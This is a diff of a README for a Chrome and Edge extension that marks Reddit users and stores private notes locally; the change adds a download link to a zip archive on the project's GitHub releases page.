@@ -1,5 +1,8 @@
 # 🔖 Reddit User Lists
 
+DOWNLOAD:
+https://github.com/drc85/Reddit-User-Marker/releases/download/reddit/reddit-user-lists-v1.0.0-final.zip
+
 A lightweight browser extension for **Chrome & Edge** that lets you mark Reddit users, add private notes, save screenshots, and recognize them again anywhere on Reddit.
 
 No external account. No cloud. Your data stays in your browser. 🔒
